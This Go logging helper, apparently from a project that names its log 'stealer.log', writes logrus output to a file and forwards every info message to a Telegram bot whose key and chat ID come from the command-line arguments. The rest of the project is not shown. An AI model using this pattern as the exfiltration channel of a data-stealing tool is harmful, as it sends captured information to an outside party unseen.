package log

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	log "github.com/sirupsen/logrus"
)

var (
	logger *log.Logger
	apiKey string
	chatID string
)

func init() {
	// Initalize logger
	logger = log.New()

	// Default configuration
	timestampFormat := "02-01-2006 15:04:05"
	logger.Formatter = &log.TextFormatter{
		TimestampFormat: timestampFormat,
		FullTimestamp:   true,
	}
	if f, err := os.OpenFile("./stealer.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666); err == nil {
		logger.Out = io.MultiWriter(f, os.Stdout)
	} else {
		fmt.Print("Failed to open log file: you can miss important log")
		logger.Out = os.Stdout
	}
	logger.SetLevel(log.InfoLevel)

	for _, val := range os.Args {
		arg := strings.Split(val, "=")
		if len(arg) < 2 {
			continue
		} else if arg[0] == "-apikey" {
			apiKey = arg[1]
		} else if arg[0] == "-chatid" {
			chatID = arg[1]
		}
	}
}

func sendTelegramMsg(msg string) {
	if apiKey == "" || chatID == "" {
		return
	}
	url := "https://api.telegram.org/bot" + apiKey + "/sendMessage?chat_id=" + chatID + "&text=" + msg
	http.Get(url)
}

// Info level logging
func Info(args ...interface{}) {
	logger.Info(args...)
	go sendTelegramMsg(fmt.Sprint(args...))
}

// Infof info-level logging with format
func Infof(format string, args ...interface{}) {
	logger.Infof(format, args...)
	go sendTelegramMsg(fmt.Sprintf(format, args...))
}
